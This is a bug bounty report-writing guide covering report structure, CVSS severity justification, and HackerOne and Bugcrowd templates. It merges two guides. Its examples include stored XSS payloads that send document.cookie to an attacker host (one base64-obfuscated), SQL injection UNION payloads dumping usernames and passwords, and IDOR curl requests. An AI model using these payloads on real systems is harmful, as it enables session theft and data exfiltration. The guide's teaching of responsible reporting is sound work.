# Bug Bounty Report Writing Guide

> Companion to `chiper-security-bounty-hunter/SKILL.md`. This guide covers impact assessment, proof-of-concept formatting, severity justification, and platform-specific report templates that maximize acceptance rates and bounty payouts.

---

## 1. Report Structure Framework

A well-structured report is the difference between a quick triage and weeks in limbo. Every report should follow this skeleton:

```markdown
## Title
[Vulnerability Type] in [Component] allows [Impact] via [Vector]

## Severity
CVSS 3.1 Score: X.X (Critical/High/Medium/Low)
Vector: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

## Summary
One paragraph describing what the vulnerability is, where it exists,
and what an attacker can achieve by exploiting it.

## Steps to Reproduce
1. Navigate to...
2. Intercept the request...
3. Modify parameter X to...
4. Observe that...

## Impact
Describe real-world consequences: data exposure, account takeover,
financial loss, privilege escalation.

## Proof of Concept
[Screenshots, HTTP requests/responses, scripts]

## Remediation
Suggested fix with specific implementation guidance.

## References
- CWE-XXX: [Name]
- OWASP: [Category]
- Related CVEs or advisories
```

---

## 2. Impact Assessment and Severity Justification

Platforms pay based on impact, not cleverness. Frame every finding in terms of business impact:

```yaml
# Impact assessment framework
vulnerability: IDOR on /api/v2/users/{id}/documents
technical_impact:
  confidentiality: HIGH  # Access to all user documents
  integrity: LOW         # Read-only access
  availability: NONE     # No service disruption

business_impact:
  data_exposure: "All 2.3M user documents accessible"
  compliance: "GDPR Article 32 violation — personal data exposed"
  financial: "Potential regulatory fine up to 4% annual revenue"
  reputation: "User trust breach if disclosed publicly"

cvss_31:
  vector: "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
  score: 6.5
  severity: MEDIUM
  justification: |
    Network-accessible (AV:N), no special conditions (AC:L),
    requires low-privilege account (PR:L), no user interaction (UI:N),
    scope unchanged (S:U), high confidentiality impact (C:H).
```

---

## 3. Proof-of-Concept Formatting

PoCs must be reproducible by a triager who has never seen your bug before. Use raw HTTP requests:

```bash
# PoC: IDOR accessing another user's private documents
# Authenticated as user ID 1337, accessing user ID 1's documents

curl -s -X GET "https://target.com/api/v2/users/1/documents" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMzM3fQ.REDACTED" \
  -H "Content-Type: application/json" | jq '.documents[] | {id, title, created_at}'

# Expected: 403 Forbidden (user 1337 should not access user 1's docs)
# Actual: 200 OK with full document listing

# Response (truncated):
# {
#   "documents": [
#     {"id": 42, "title": "tax_return_2024.pdf", "created_at": "2024-01-15"},
#     {"id": 43, "title": "medical_records.pdf", "created_at": "2024-02-20"}
#   ],
#   "total": 847
# }
```

For XSS, provide a self-contained payload:

```bash
# PoC: Stored XSS in user profile bio field
# Step 1: Inject payload via profile update
curl -X PUT "https://target.com/api/users/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"bio": "<img src=x onerror=\"fetch(atob(`aHR0cHM6Ly9hdHRhY2tlci5jb20vc3RlYWw/Yz0=`)+document.cookie)\">"}'

# Step 2: Victim views attacker profile at /users/1337
# Result: Victim cookies exfiltrated to attacker server
# Impact: Full session hijack of any user viewing the profile
```

---

## 4. Platform-Specific Templates

### HackerOne Report Template

```markdown
## Summary
A [vulnerability type] vulnerability exists in [endpoint/feature] that allows
an attacker to [impact]. This affects [scope of affected users/data].

## Severity Justification
**CVSS 3.1**: X.X ([Vector String])
- Attack Vector: Network (remotely exploitable)
- Privileges Required: [None/Low/High]
- User Interaction: [None/Required]
- Impact: [Confidentiality/Integrity/Availability]

## Steps to Reproduce
1. Create account at https://target.com/signup
2. Navigate to [feature]
3. Using Burp Suite, intercept the request to [endpoint]
4. Modify [parameter] from [original] to [malicious]
5. Forward the request
6. Observe [evidence of exploitation]

## Supporting Material/References
- screenshot_1.png — Shows the vulnerable request
- screenshot_2.png — Shows unauthorized data in response
- poc.py — Automated exploitation script

## Impact
An attacker with [access level] can [specific action] affecting
[number/scope] of users. This could lead to [business consequence].
```

### Bugcrowd Submission Format

```markdown
**URL**: https://target.com/api/v2/admin/users
**Vulnerability Type**: Broken Access Control (P1)
**Browser/Environment**: curl 8.5.0 / Burp Suite 2024.1

**Description**:
The admin user listing endpoint lacks authorization checks. Any
authenticated user can access the full admin panel API by directly
requesting /api/v2/admin/* endpoints.

**PoC**:
[Numbered steps with curl commands and screenshots]

**Suggested Fix**:
Implement role-based access control middleware on all /api/v2/admin/*
routes. Verify the requesting user has admin role before processing.
```

---

## 5. Writing for Maximum Payout

Key principles that increase bounty amounts:

```yaml
# Report quality multipliers
high_payout_signals:
  - demonstrate_full_chain: "Show complete attack from initial access to impact"
  - quantify_affected_users: "This affects all 2.3M registered users"
  - show_data_sensitivity: "Exposes PII including SSN, medical records"
  - provide_remediation: "Specific code fix, not just 'validate input'"
  - chain_vulnerabilities: "IDOR + CSRF = account takeover without interaction"

low_payout_signals:
  - vague_impact: "This could potentially be dangerous"
  - missing_poc: "I believe this endpoint is vulnerable"
  - theoretical_only: "If an attacker could somehow..."
  - duplicate_indicators: "I found this using automated scanner X"
  - scope_confusion: "Found on staging.target.com (out of scope)"
```

---

## 6. Handling Triage Responses

When reports are questioned or downgraded, respond professionally with additional evidence:

```markdown
## Response to Triage Feedback

Thank you for the review. Regarding the concern that this requires
authentication:

**Clarification**: While the attack requires a valid session, the
authorization boundary being bypassed is between regular users and
admin functionality. Any of the 2.3M registered users can:

1. Register a free account (no approval needed)
2. Access admin-only endpoints using their regular session token
3. Export all user data including emails and hashed passwords

**Additional Evidence**:
- Attached: full_user_export.json (redacted) showing 50 records
  retrieved with a free-tier account
- The /api/v2/admin/export endpoint returns data paginated at 100
  records per request with no rate limiting

**Revised Impact**: Complete database exfiltration by any registered
user. This is not a theoretical risk — the attached export proves
full exploitation.
```

---

## 7. Automated Report Generation

Script repetitive report elements to maintain quality at scale:

```python
#!/usr/bin/env python3
"""Generate structured bug bounty report from findings data."""

from dataclasses import dataclass
from datetime import date

@dataclass(frozen=True)
class Finding:
    title: str
    vuln_type: str
    endpoint: str
    severity: str
    cvss_score: float
    cvss_vector: str
    impact: str
    steps: tuple[str, ...]
    remediation: str

def generate_report(finding: Finding) -> str:
    steps_formatted = "\n".join(
        f"{i+1}. {step}" for i, step in enumerate(finding.steps)
    )
    return f"""# {finding.title}

**Date**: {date.today().isoformat()}
**Severity**: {finding.severity} (CVSS {finding.cvss_score})
**Vector**: {finding.cvss_vector}
**Type**: {finding.vuln_type}
**Endpoint**: `{finding.endpoint}`

## Summary
{finding.title} — {finding.impact}

## Steps to Reproduce
{steps_formatted}

## Impact
{finding.impact}

## Remediation
{finding.remediation}
"""

# Example usage
finding = Finding(
    title="IDOR in Document API Exposes All User Files",
    vuln_type="Broken Access Control (CWE-639)",
    endpoint="/api/v2/users/{id}/documents",
    severity="HIGH",
    cvss_score=7.5,
    cvss_vector="AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    impact="Any authenticated user can access documents belonging to any other user",
    steps=(
        "Authenticate as user A (attacker account)",
        "Send GET /api/v2/users/1/documents with attacker's auth token",
        "Observe 200 response containing user 1's private documents",
        "Iterate user IDs to enumerate all documents in the system",
    ),
    remediation="Add authorization check: verify requesting user owns the resource"
)
print(generate_report(finding))
```

---

## 8. Common Rejection Reasons and Prevention

Avoid these report pitfalls that lead to "Informative" or "Not Applicable" closures:

```yaml
rejection_reasons:
  out_of_scope:
    prevention: "Always verify the asset is in scope before reporting"
    check: "grep -i 'scope' program_policy.txt"

  duplicate:
    prevention: "Search disclosed reports, check if obvious/well-known"
    check: "Search HackerOne Hacktivity for similar reports on same program"

  insufficient_impact:
    prevention: "Demonstrate real-world exploitation, not just theoretical"
    check: "Can I show actual data accessed or action performed?"

  not_reproducible:
    prevention: "Test PoC from clean environment before submitting"
    check: "Run PoC in incognito/fresh session without cached state"

  informational:
    prevention: "Ensure finding has security impact, not just bad practice"
    check: "What can an attacker DO with this? If nothing concrete, don't report"
```

Reports that demonstrate clear impact, provide reproducible PoCs, and frame findings in business terms consistently receive higher bounties and faster triage times.

---

## 9. Platform-Specific Report Guidelines

Different platforms have different triage processes and expectations. Tailoring your report format to the platform improves acceptance rates.

### HackerOne Report Best Practices

- Use the platform's built-in severity calculator for CVSS scoring
- Attach screenshots directly in the report (not external links)
- Include a 30-second video demonstration when possible
- Reference specific program policy sections when justifying severity
- HackerOne triagers handle 50+ reports daily; keep reports under 500 words for the initial submission

### Bugcrowd Report Best Practices

- Use Bugcrowd's Vulnerability Rating Taxonomy (VRT) for classification
- Map findings to the program's specific bounty table
- Include "Attack Scenario" section describing a realistic attack chain
- Bugcrowd triage is often faster; shorter reports work well

### Synack Report Best Practices

- Synack targets are higher-value; expect more thorough triage
- Include network diagrams when reporting complex vulnerabilities
- Document the full attack chain, not just the endpoint
- Synack requires "Clear, Actionable, Impactful" reports; all three elements are mandatory

---

## 10. Severity Negotiation Techniques

When a triager downgrades your finding, a professional response can often restore the original severity:

**Response template for severity downgrade:**

```markdown
Thank you for the triage. I'd like to respectfully discuss the severity
assessment. I believe this finding warrants [original severity] rather
than [downgraded severity] based on the following:

1. **Blast radius**: The vulnerability affects [X] users/records, not
   just the single account demonstrated in the PoC. I confirmed this by
   [describe additional testing].

2. **Attack simplicity**: The exploit requires no special tools or skills.
   A [describe attacker profile] could replicate this in under 5 minutes.

3. **Business impact**: Beyond the technical vulnerability, this exposes
   the organization to [regulatory/compliance/financial] risk because
   [specific reason].

4. **Program severity criteria**: Per the program's policy, [severity level]
   is defined as "[quote policy]". My finding matches this definition because
   [specific mapping].

Would you like me to provide additional evidence or a more comprehensive
impact demonstration?
```

---

## Hands-on Exercises

1. **Exercise 1**: Write a complete bounty report for a hypothetical SQL injection finding using the report structure framework. Include all sections: title, severity, summary, steps to reproduce, impact, PoC, and remediation. Aim for under 500 words while maintaining all critical information
2. **Exercise 2**: Take the same SQL injection finding and write it in three different styles: HackerOne format, Bugcrowd format, and a raw email to a vendor for responsible disclosure. Compare the differences in tone, structure, and level of detail
3. **Exercise 3**: Practice severity negotiation. Write a response to a triager who has downgraded your Critical finding to Medium. Include specific evidence, program policy references, and business impact arguments

---

## References

- HackerOne Hacktivity: https://hackerone.com/hacktivity
- Bugcrowd VRT: https://bugcrowd.com/vulnerability-rating-taxonomy
- OWASP Bug Bounty Guide: https://owasp.org/www-community/vulnerabilities/
- CVSS 3.1 Calculator: https://www.first.org/cvss/calculator/3.1
- CWE Database: https://cwe.mitre.org/
- PortSwigger Web Security Academy: https://portswigger.net/web-security

---

> **Digabung dari `guides/report-writing-bounty-guide.md` (2026-11-25) — konten dipertahankan utuh.**

# Report Writing Guide for Bug Bounty

## Introduction

A bug bounty report is the deliverable that determines whether your finding gets accepted, rewarded, and resolved. Even a critical vulnerability can be rejected if the report is unclear, incomplete, or fails to demonstrate impact. This guide covers the structure of effective bug bounty reports, with before-and-after examples showing the difference between reports that get rewarded and reports that get closed.

The key principle is: write your report so that a triager can reproduce the bug in under five minutes and understand the business impact in one sentence. Every additional minute a triager spends understanding your report reduces your chance of a timely resolution.

## Practical Steps

### 1. Title Format

The title should summarize the vulnerability type, affected component, and impact in a single line.

**Bad title:**
```
XSS on your website
```

**Good title:**
```
Stored XSS in User Profile Bio allows session hijacking of any visitor (CRITICAL)
```

**Title formula:**

```
[Vulnerability Type] in [Affected Component] allows [Impact] ([Severity])
```

Examples:

```
SSRF via image URL parameter enables access to AWS metadata credentials (HIGH)
IDOR in /api/v2/orders/{id} exposes all customer PII (CRITICAL)
Reflected XSS in search parameter bypasses CSP via base tag injection (MEDIUM)
```

### 2. Severity Justification

Map the finding to a CVSS score or the platform severity criteria:

**Bad justification:**
```
This is critical because XSS is dangerous.
```

**Good justification:**
```
Severity: HIGH (CVSS 7.5)

Justification: This stored XSS executes in the context of the admin dashboard
(/admin/users). Any administrator viewing the compromised user profile will have
their session token exfiltrated. The admin dashboard has access to all customer
PII including SSNs and payment data. No user interaction is required beyond
viewing the user management page, which is part of the daily admin workflow.
```

### 3. Reproduction Steps

Write numbered, step-by-step instructions that anyone can follow:

**Bad reproduction:**
```
Just put a script tag in the comment field and it executes.
```

**Good reproduction:**
```
1. Log in as a standard user (test@demo.com / Password123!)
2. Navigate to https://target.com/profile/edit
3. In the "Bio" field, enter the following payload:
   <img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">
4. Click "Save Profile"
5. Log in as an administrator (admin@demo.com / AdminPass456!)
6. Navigate to https://target.com/admin/users
7. Observe the network request to attacker.com with the admin session cookie
8. The admin session is now compromised

Expected behavior: The bio content should be HTML-encoded before rendering.
Actual behavior: The bio content is rendered as raw HTML, executing JavaScript.
```

### 4. Impact Analysis

Clearly state what an attacker can achieve:

**Bad impact:**
```
An attacker can steal cookies.
```

**Good impact:**
```
Business Impact:

- Full account takeover of any administrator who views the compromised profile
- Access to the admin panel which contains PII for 50,000+ customers
- Ability to modify user roles, granting attacker persistent admin access
- Potential for lateral movement into internal systems via admin API endpoints
- Regulatory exposure under GDPR Article 32 (failure to protect personal data)
```

### 5. Remediation Suggestions

Provide actionable fix recommendations:

**Bad remediation:**
```
Fix the XSS.
```

**Good remediation:**
```
Remediation Recommendations:

1. Output Encoding: HTML-encode all user-generated content before rendering.
   Use a library like DOMPurify (frontend) or the server-side template
   engine's built-in escaping.

2. Content Security Policy: Implement a strict CSP header:
   Content-Security-Policy: default-src 'self'; script-src 'self'

3. Input Validation: Sanitize the bio field server-side to strip HTML tags:
   bio = bleach.clean(user_input, tags=[], strip=True)

4. HttpOnly Cookies: Mark session cookies as HttpOnly to prevent JavaScript
   access even if XSS occurs:
   Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### 6. Full Report Template

```
Title: [Vulnerability Type] in [Component] allows [Impact]

Severity: [CRITICAL/HIGH/MEDIUM/LOW]
CVSS Score: [X.X]

Description:
[A 2-3 sentence summary of what the vulnerability is and where it exists]

Steps to Reproduce:
1. [Step]
2. [Step]
...

Proof-of-Concept:
[Link to PoC or inline code]

Impact:
[What an attacker can achieve]

Remediation:
[How to fix it]

References:
[Links to OWASP, CVEs, or relevant documentation]
```

## References

- HackerOne Hacktivity (top reports): https://hackerone.com/hacktivity
- Bugcrowd Vulnerability Rating Taxonomy: https://bugcrowd.com/vulnerability-rating-taxonomy
- OWASP Bug Bounty Template: https://owasp.org/www-project-bug-bounty-template/
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1
- PortSwigger Web Security Academy: https://portswigger.net/web-security

---

## Hands-on Exercises

1. **Exercise 1**: Select a vulnerability from HackerOne Hacktivity and rewrite the disclosure using the report template above, improving clarity and adding business impact analysis
2. **Exercise 2**: Write two reports for the same hypothetical XSS finding -- one "bad" report and one "excellent" report. Compare them side-by-side and identify specific improvements
3. **Exercise 3**: Create a report for a chained vulnerability (SSRF to internal service access) that includes a visual attack flow diagram and demonstrates why the combined severity is higher than individual findings

---

## Advanced Report Techniques

### Adding Video Evidence

Video recordings dramatically improve triage speed and reduce back-and-forth clarification:

```bash
# Record a PoC video on macOS
# Open QuickTime Player → File → New Screen Recording → record the PoC

# Record on Linux with recordmydesktop
recordmydesktop --output poc_sqli.ogv --windowid $(xdotool getactivewindow)

# Convert to a reasonable size
ffmpeg -i poc_sqli.ogv -c:v libx264 -crf 28 -preset fast poc_sqli.mp4

# Upload to a private YouTube video or include as attachment
```

**Video best practices:**
- Keep under 2 minutes; triagers will not watch 15-minute videos
- Start from a clean browser state (no cookies, no cached data)
- Show the login step if authentication is required
- Narrate or add text overlays explaining each step
- Display the URL bar prominently so the endpoint is visible

### Handling Triager Pushback

Sometimes triagers downgrade severity or mark reports as duplicates. Here is how to respond professionally:

```markdown
## Response to Duplicate Marking

Thank you for reviewing my report. I believe this finding differs from #12345
in the following ways:

1. **Different endpoint**: My finding affects /api/v2/users/{id}, while #12345
   reports on /api/v1/users/{id}
2. **Different exploit path**: The v2 API enforces role-based access control,
   but the bypass I found exploits a separate authorization middleware
3. **Different impact**: My finding exposes payment data (PCI scope) in addition
   to the PII covered by the original report

Would you like me to provide a side-by-side comparison with additional evidence?
```

**Escalation options:**
- Request re-triage through the platform's dispute process
- Provide additional evidence that differentiates your finding
- Demonstrate a higher impact than the original report showed
- Document the business impact that the duplicate report did not cover

### Report Templates by Vulnerability Class

Different vulnerability types require different report structures. Here are optimized templates for common bounty findings:

**SQL Injection Report Template:**

```markdown
Title: SQL Injection in [endpoint] allows [impact]

Severity: [CRITICAL/HIGH]
CVSS Score: [X.X]
CWE: CWE-89

Description:
The [parameter] parameter in [endpoint] is vulnerable to SQL injection.
The application concatenates user input directly into SQL queries
without parameterization, allowing an attacker to extract the full
database contents.

Steps to Reproduce:
1. Navigate to [endpoint]
2. Insert the following payload into [parameter]: ' UNION SELECT 1,2,3--
3. Observe the application returns 3 columns in the response
4. Extract database version: ' UNION SELECT @@version,2,3--
5. Extract table names: ' UNION SELECT table_name,2,3 FROM information_schema.tables--

Proof of Concept:
```bash
curl -s "https://target.com/api/search?q=' UNION SELECT username,password,3 FROM users--"
```

Impact:
- Full database read access confirmed
- Database contains [X] user records with PII
- Any authenticated user (or unauthenticated) can exploit

Remediation:
- Use parameterized queries / prepared statements
- Implement input validation with allowlists
- Apply least-privilege database permissions
```

**IDOR Report Template:**

```markdown
Title: IDOR in [endpoint] allows unauthorized access to [resource]

Severity: [HIGH/CRITICAL]
CWE: CWE-639

Description:
The [endpoint] endpoint does not verify that the requesting user
is authorized to access the requested resource. By changing the
[ID parameter] value, an attacker can access any user's [resource].

Steps to Reproduce:
1. Authenticate as User A (attacker@test.com)
2. Request: GET /api/v1/users/42/profile
3. Observe: Returns User B's profile data (name, email, phone, address)
4. Iterate IDs 1-100 to confirm mass data exposure

Impact:
- [X] user records accessible without authorization
- Data includes [list PII types]
- No rate limiting on API endpoint enables mass enumeration
```
